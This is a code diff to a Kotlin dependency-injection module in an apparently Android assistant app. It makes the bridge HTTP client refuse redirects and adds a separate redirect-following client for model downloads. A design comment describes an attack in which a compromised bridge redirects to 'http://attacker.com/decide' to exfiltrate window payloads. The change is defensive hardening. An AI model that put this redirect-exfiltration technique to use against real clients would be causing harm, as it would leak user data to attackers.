@@ -27,7 +27,13 @@ import kotlinx.serialization.json.Json
 import okhttp3.OkHttpClient
 import okhttp3.logging.HttpLoggingInterceptor
 import java.util.concurrent.TimeUnit
+import javax.inject.Qualifier
 import javax.inject.Singleton
+
+/** Marks the OkHttpClient configured for model-weight downloads (follows redirects). */
+@Qualifier
+@Retention(AnnotationRetention.BINARY)
+annotation class ModelDownloadHttp
 
 @Module
 @InstallIn(SingletonComponent::class)
@@ -46,14 +52,17 @@ object AppModule {
         explicitNulls = false
     }
 
-    @Provides
-    @Singleton
-    fun provideOkHttp(): OkHttpClient {
-        // B-34: bridge URL (potentially the user's home IP) ends up in
-        // logcat at BASIC level. Restrict to debug builds — release ships
-        // with NONE so a release-build APK doesn't leak the user's LAN
-        // topology into logs that other on-device apps used to be able to
-        // read on older Android versions.
+    /**
+     * Shared base client config (logging, timeouts). Two derived clients
+     * differ on a single dimension — redirect following — because the two
+     * use cases need opposite policies:
+     *   - BRIDGE: no redirects (PCA-S-36 — a compromised bridge could
+     *     respond `302 Location: http://attacker.com/decide` and we'd
+     *     exfiltrate window payloads).
+     *   - MODEL DOWNLOAD: follow redirects (HuggingFace `/resolve/main/...`
+     *     URLs 302 to their CDN).
+     */
+    private fun baseHttpBuilder(): OkHttpClient.Builder {
         val log = HttpLoggingInterceptor().apply {
             level = if (BuildConfig.DEBUG) {
                 HttpLoggingInterceptor.Level.BASIC
@@ -66,8 +75,36 @@ object AppModule {
             .readTimeout(60, TimeUnit.SECONDS)
             .writeTimeout(60, TimeUnit.SECONDS)
             .addInterceptor(log)
-            .build()
     }
+
+    /**
+     * Default OkHttp used by [com.pca.assistant.llm.HttpBridgeProvider]
+     * (and any callers without a redirect-following requirement). Refuses
+     * to follow 30x responses — see PCA-S-36.
+     */
+    @Provides
+    @Singleton
+    fun provideOkHttp(): OkHttpClient = baseHttpBuilder()
+        .followRedirects(false)
+        .followSslRedirects(false)
+        .build()
+
+    /**
+     * Permissive OkHttp for model weight downloads. Hugging Face routes
+     * `/resolve/main/<file>` through 30x to a CDN URL — we must follow
+     * to get the actual bytes. The downloader still gates the final URL
+     * via [com.pca.assistant.models.ModelDownloader.isAcceptableModelUrl],
+     * which only allows https (or http to loopback / RFC-1918) — so an
+     * attacker-controlled redirect to a public-http host is rejected
+     * once the download starts hitting the CDN URL.
+     */
+    @Provides
+    @Singleton
+    @ModelDownloadHttp
+    fun provideModelDownloadOkHttp(): OkHttpClient = baseHttpBuilder()
+        .followRedirects(true)
+        .followSslRedirects(true)
+        .build()
 
     @Provides
     @Singleton
